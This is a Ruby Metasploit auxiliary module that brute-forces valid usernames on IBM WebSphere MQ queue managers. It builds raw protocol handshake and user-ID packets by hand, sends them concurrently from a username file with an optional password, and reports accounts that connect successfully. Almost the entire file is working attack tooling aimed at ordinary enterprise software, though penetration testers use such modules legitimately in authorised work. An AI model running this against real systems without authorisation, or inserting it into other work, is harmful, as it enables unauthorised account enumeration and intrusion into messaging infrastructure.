##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'IBM WebSphere MQ Login Check',
      'Description' => 'This module can be used to bruteforce usernames that can be used to connect to a queue manager. The name of a valid server-connection channel without SSL configured is required, as well as a list of usernames to try.',
      'Author'      => 'Petros Koutroumpis',
      'License'     => MSF_LICENSE
    )
    register_options([
      Opt::RPORT(1414),
      OptInt.new('TIMEOUT', [true, "The socket connect timeout in seconds", 5]),
      OptInt.new('CONCURRENCY', [true, "The number of usernames to check concurrently", 10]),
      OptString.new('QUEUE_MANAGER', [true, "Queue Manager name to use" ,""]),
      OptString.new('CHANNEL', [true, "Channel to use" ,"SYSTEM.ADMIN.SVRCONN"]),
      OptString.new('PASSWORD', [false, "Optional password to attempt with login"]),
      OptPath.new('USERNAMES_FILE',
        [ true, "The file that contains a list of usernames. UserIDs are case insensitive!"]
      )])
    #deregister_options('THREADS')
  end

  def run_host(ip)
    @usernames = []
    if datastore['CHANNEL'].length.to_i > 20
      print_error("Channel name cannot be more that 20 characters.")
      exit
    end
    if datastore['QUEUE_MANAGER'].length.to_i > 48
     print_error("Queue Manager name cannot be more that 48 characters.")
     exit
    end
    begin
      username_list
      rescue ::Rex::ConnectionError
      rescue ::Exception => e
        print_error("#{e} #{e.backtrace}")
      end
      print_line
      if(@usernames.empty?)
        print_status("#{ip}:#{rport} No valid users found.")
      else
        print_good("#{ip}:#{rport} Valid usernames found: #{@usernames}")
        report_note(
          :host => rhost,
          :port => rport,
          :type => 'mq.usernames'
        )
      print_line
    end
  end

  def first_packet(channel,qm_name)
    init1 = "\x54\x53\x48\x20" + 	# StructId
    "\x00\x00\x01\x0c" + 		# MQSegmLen
    "\x01" + 				# ByteOrder
    "\x01" + 				# SegmType
    "\x31" + 				# CtlFlag1
    "\x00" + 				# CtlFlag2
    "\x00\x00\x00\x00\x00\x00\x00\x00" +# LUW Ident
    "\x00\x00\x01\x11" + 		# Encoding
    "\x04\xb8" + 			# CCSID
    "\x00\x00" + 			# Reserved
    "\x49\x44\x20\x20" + 		# StructId
    "\x0d" + 				# FAPLevel
    "\x26" + 				# CapFlag1
    "\x00" + 				# ECapFlag1
    "\x00" + 				# InierrFlg1
    "\x00\x00" + 			# ReserveD
    "\x00\x00" + 			# MaxMsgBtch
    "\x00\x00\x7f\xec" + 		# MaxTrSize
    "\x06\x40\x00\x00" + 		# MaxMsgSize
    "\x00\x00\x00\x00" + 		# SeqWrapVal
    channel + 				# Channel Name
    "\x51" + 				# CapFlag2
    "\x00" + 				# ECapFlag2
    "\x04\xb8" + 			# ccsid
    qm_name + 				# Queue Manager Name
    "\x00\x00\x00\x01" + 		# HBInterval
    "\x00\x8a" + 			# EFLLength
    "\x00" +				# IniErrFlg2
    "\x00" + 				# Reserved1
    "\x00\xff" + 			# HdrCprsLst
    "\x00\xff\xff\xff\xff\xff\xff\xff" +# MsgCprsLst1
    "\xff\xff\xff\xff\xff\xff\xff\xff" +# MsgCprsLst2
    "\x00\x00" + 			# Reserved2
    "\x00\x00\x00\x00" + 		# SSLKeyRst
    "\x00\x00\x00\x0a" + 		# ConvBySkt
    "\x08" + 				# CapFlag3
    "\x00" + 				# ECapFlag3
    "\x00\x00" + 			# Reserved3
    "\x00\x00\x00\x00" + 		# ProcessId
    "\x00\x00\x00\x00" + 		# ThreadId
    "\x00\x00\x00\x1b" + 		# TraceId
    "MQMM09000000" + 			# ProdId
    "MQMID" + "\x20"*43 + 		# MQM ID
    "\x00\x01\x00\x00\xff\xff\xff\xff" +# Unknown1
    "\xff\xff\xff\xff\xff\xff\xff\xff" +# Unknown2
    "\xff\xff\xff\xff\xf1\x18\xa6\x93" +# Unknown3
    "\x2b\x8a\x44\x3c\x67\x53\x73\x08"	# Unknown4
  end

  def second_packet(channel,qm_name)
    init2 = "\x54\x53\x48\x4d" + 	# StructId
    "\x00\x00\x00\xf4" + 		# MQSegmLen
    "\x00\x00\x00\x01" + 		# Convers Id
    "\x00\x00\x00\x00" + 		# Request Id
    "\x02" + 				# ByteOrder
    "\x01" + 				# SegmType
    "\x31" + 				# CtlFlag1
    "\x00" + 				# CtlFlag2
    "\x00\x00\x00\x00\x00\x00\x00\x00" +# LUW Ident
    "\x11\x01\x00\x00" + 		# Encoding
    "\xb5\x01" + 			# CCSID
    "\x00\x00" + 			# Reserved
    "\x49\x44\x20\x20" + 		# StructId
    "\x0c" + 				# FAPLevel
    "\x26" + 				# CapFlag1
    "\x00" + 				# ECapFlag1
    "\x00" + 				# IniErrFlg1
    "\x00\x00" + 			# Reserved
    "\x00\x00" + 			# MaxMsgBtch
    "\xec\x7f\x00\x00" + 		# MaxTrSize
    "\x00\x00\x40\x00" + 		# MaxMsgSize
    "\x00\x00\x00\x00" + 		# SeqWrapVal
    channel + 				# Channel Name
    "\x51" + 				# CapFlag2
    "\x00" + 				# ECapFlag2
    "\xb5\x01" + 			# ccsid
    qm_name + 				# Queue Manager Name
    "\x2c\x01\x00\x00" + 		# HBInterval
    "\x8a\x00" + 			# EFLLength
    "\x00" + 				# IniErrFlg2
    "\x00" + 				# Reserved1
    "\x00\xff" + 			# HdrCprsLst
    "\x00\xff\xff\xff\xff\xff\xff" + 	# MsgCprsLst1
    "\xff\xff\xff\xff\xff\xff\xff" + 	# MsgCprsLst2
    "\xff\xff" + 			# MsgCprsLst3
    "\x00\x00" + 			# Reserved2
    "\x00\x00\x00\x00" + 		# SSLKeyRst
    "\x0a\x00\x00\x00" + 		# ConvBySkt
    "\x00" + 				# CapFlag3
    "\x00" + 				# ECapFlag3
    "\x00\x00" + 			# Reserved3
    "\x00\x00\x00\x00" + 		# ProcessId
    "\x00\x00\x00\x00" + 		# ThreadId
    "\x1b\x00\x00\x00" + 		# TraceId
    "MQMM09000000" + 			# ProdId
    "MQMID" + "\x20"*43 		# MQM ID
  end

  def send_userid(userid,uname)

    if datastore['PASSWORD'].nil?
      password = "\x00" * 12
    else
      password = datastore['PASSWORD']
      if (password.length > 12)
        print_warning("Passwords greater than 12 characters are unsupported.  Truncating...")
        password = password[0..12]
      end
      password = password + ( "\x00" * (12-password.length) )
    end
    vprint_status("Using password: '#{password}' (Length: #{password.length})")

    send_userid = "\x54\x53\x48\x4d" + 	# StructId
    "\x00\x00\x00\xa8" + 		# MQSegmLen
    "\x00\x00\x00\x01" + 		# Convers ID
    "\x00\x00\x00\x00" + 		# Request ID
    "\x02" + 				# Byte Order
    "\x08" + 				# SegmType
    "\x30" + 				# CtlFlag1
    "\x00" + 				# CtlFlag2
    "\x00\x00\x00\x00\x00\x00\x00\x00" +# LUW Ident
    "\x11\x01\x00\x00" + 		# Encoding
    "\xb5\x01" + 			# CCSID
    "\x00\x00" + 			# Reserved
    "\x55\x49\x44\x20" + 		# StructId
    userid + 				# UserId - Doesnt affect anything
    password +                          # Password
    uname + 				# Long UID - This matters!
    "\x00" + 				# SID Len
    "\x00" * 39 			# Unknown
  end

  def start_conn(qm_name)
    start_conn = "\x54\x53\x48\x4d" + 	# StructId
    "\x00\x00\x01\x38" + 		# MQSegmLen
    "\x00\x00\x00\x01" + 		# Convers ID
    "\x00\x00\x00\x00" + 		# Request ID
    "\x02" + 				# Byte Order
    "\x81" + 				# SegmType
    "\x30" + 				# CtlFlag1
    "\x00" + 				# CtlFlag2
    "\x00\x00\x00\x00\x00\x00\x00\x00" +# LUW Ident
    "\x11\x01\x00\x00" + 		# Encoding
    "\xb5\x01" + 			# CCSID
    "\x00\x00" +			# Reserved
    "\x00\x00\x01\x38" + 		# Reply Len
    "\x00\x00\x00\x00" + 		# Compl Code
    "\x00\x00\x00\x00" + 		# Reason Code
    "\x00\x00\x00\x00" + 		# Object Hdl
    qm_name + 				# Queue Manager Name
    "\x4d\x51\x20\x45\x78\x70\x6c" + 	# Appl Name
    "\x6f\x72\x65\x72\x20\x39\x2e" + 	# Appl Name
    "\x30\x2e\x30\x20\x20\x20\x20" + 	# Appl Name
    "\x20\x20\x20\x20\x20\x20\x20" + 	# Appl Name
    "\x1c\x00\x00\x00" + 		# ApplType
    "\x00" * 32 + 			# AccntTok
    "\x03\x00\x00\x00" + 		# MQCONNX
    "\x00\x00\x00\x00" + 		# Options
    "\x46\x43\x4e\x4f" + 		# Struct ID
    "\x02\x00\x00\x00" + 		# Version
    "\x00\x00\x00\x00" + 		# Option
    "\x4d\x51\x4a\x42\x30\x39\x30" + 	# msgid
    "\x30\x30\x30\x30\x34" + 		# msgid
    "MQM" + "\x20" * 45 + 		# MqmId
    "\x00" * 68				# Unknown
  end

  def username_list
    username_data = get_usernames
    while (username_data.length > 0)
      t = []
      r = []
      begin
        1.upto(datastore['CONCURRENCY']) do
          this_username = username_data.shift
          if this_username.nil?
            next
          end
          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}:#{rport}", false, this_username) do |username|
            connect
            vprint_status "#{rhost}:#{rport} - Sending request for #{username}..."
            channel = datastore['CHANNEL']
            if channel.length > 20
              print_error("Channel name must be less than 20 characters.")
              next
            end
            channel += "\x20" * (20-channel.length.to_i) # max channel name length is 20
            qm_name = datastore['QUEUE_MANAGER']
            if qm_name.length > 48
              print_error("Queue Manager name must be less than 48 characters.")
              next
            end
            qm_name += "\x20" * (48-qm_name.length.to_i) # max queue manager name length is 48
            if username.length > 12
              print_error("Username must be less than 12 characters.")
              next
            end
            uname = username + "\x20" * (64-username.length.to_i)
            userid = username + "\x20" * (12 - username.length.to_i) # this doesnt make a difference
            timeout = datastore['TIMEOUT'].to_i
            s = connect(false,
              {
                'RPORT' => rport,
                'RHOST' => rhost,
              }
            )
            s.put(first_packet(channel,qm_name))
            first_response = s.get_once(-1,timeout)
            if first_response[-4..-1] == "\x00\x00\x00\x02" # CHANNEL_WRONG_TYPE code
              print_error("Channel needs to be MQI type!")
              next
            end
            s.put(second_packet(channel,qm_name))
            second_response = s.get_once(-1,timeout)
            s.put(send_userid(userid,uname))
            s.put(start_conn(qm_name))
            data = s.get_once(-1,timeout)
            if data[41..44] == "\x00\x00\x00\x00"
                  print_status("Found username: #{username}")
                  @usernames << username
            end
            disconnect
          end
        end
        t.each {|x| x.join }
      end
    end
  end

  def get_usernames
    if(! @common)
      File.open(datastore['USERNAMES_FILE'], "rb") do |fd|
        data = fd.read(fd.stat.size)
        @common = data.split(/\n/).compact.uniq
      end
    end
    @common
  end

end
